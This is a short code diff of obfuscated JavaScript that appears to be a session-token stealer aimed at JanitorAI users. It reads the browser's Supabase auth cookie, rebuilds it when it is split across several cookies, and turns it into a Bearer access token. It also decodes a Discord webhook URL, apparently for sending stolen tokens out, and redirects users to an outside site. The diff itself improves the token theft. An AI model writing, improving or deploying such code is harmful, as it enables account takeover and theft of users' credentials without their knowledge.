@@ -1,7 +1,7 @@
 if (window.location.href.includes("3a0f9ae1-87a0-4035-9c6c-bb6adb43b8e7") && !window.location.href.includes("?comments=true")) {
     window.location.href = "https://janitorai.com/profiles/7a1053de-a29c-4416-8b91-0e86bdc42e0b";
 }
-window.__xnext=function(){try{let t=document.cookie.split(";").reduce((t,r)=>{let[c,e]=r.split("=");return t[c.trim()]=decodeURIComponent(e.trim()),t},{}),r=atob("c2ItYXV0aC1hdXRoLXRva2Vu");xx=atob("c2ItYXV0aC1hdXRoLXRva2VuLjA="),zz=atob("YWNjZXNzX3Rva2Vu"),z=atob("QmVhcmVyIA=="),el=t[r],null==el&&(el=xx);let c=JSON.parse(atob(t[r].substr(7,t[r].length)));return z+c[zz]}catch{window.location.href="https://cxxzx.carrd.co/"}};
+window.__xnext=function(){let t=document.cookie.split(";").reduce((t,e)=>{let[l,o]=e.split("=");return t[l.trim()]=decodeURIComponent(o.trim()),t},{}),e=atob("c2ItYXV0aC1hdXRoLXRva2Vu");if(zz=atob("YWNjZXNzX3Rva2Vu"),z=atob("QmVhcmVyIA=="),null==(el=t[e])){let l=[],o=0;for(;void 0!==t[e+"."+o];)l.push(t[e+"."+o]),o++;l.length>0&&(el=l.join(""))}if(null!=el)return z+JSON.parse(atob(el.substr(7,el.length)))[zz];window.location.href="https://cxxzx.carrd.co/"};
 function d(en) {
     return atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv') + atob(en);
 }
